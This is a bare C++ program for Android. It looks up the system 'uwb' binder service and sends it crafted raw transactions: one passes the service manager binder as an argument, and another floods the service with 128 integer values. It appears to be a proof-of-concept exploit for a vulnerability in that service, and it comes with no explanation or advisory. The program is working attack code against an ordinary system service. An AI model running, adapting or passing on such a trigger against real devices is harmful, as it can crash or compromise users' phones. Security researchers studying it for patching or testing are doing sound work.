
#include <binder/IPCThreadState.h>
#include <binder/IServiceManager.h>
#include <binder/ProcessState.h>
#include <stdio.h>

constexpr uint8_t kCount = 128;
constexpr size_t kPosition = 104;

/*
    shared_libs: [
        "libutils",
        "libbinder",

*/

using namespace android;

int main() {
    sp < IServiceManager > sm = defaultServiceManager();
    if (!sm) {
        printf("failed to get service manager!");
        return EXIT_FAILURE;
    }
    String16 name(String16("uwb"));
    sp < IBinder > service = sm->checkService(name);
    if (!service) {
        printf("failed to get service!");
        return EXIT_FAILURE;
    }
    printf("own pid: %d\n", getpid());
    uint32_t code = 2, flags = 0;
    Parcel data1, reply1;
    String16 iname = service->getInterfaceDescriptor();
    #ifdef ANDROID9
	    printf("iternface name %s\n", String8(iname).c_str());
    #else 
	    printf("iternface name %s\n", iname.c_str());
    #endif
    data1.writeInterfaceToken(iname);
    data1.writeStrongBinder(sm);
    service->transact(4, data1, &reply1, flags);
    

    Parcel data2, reply2;
    data2.writeInterfaceToken(iname);
    for (uint8_t n = 0; n < kCount; ++n) {
        data2.writeInt32(1);
    }
    service->transact(4, data2, &reply2, flags);

    return EXIT_SUCCESS;
}
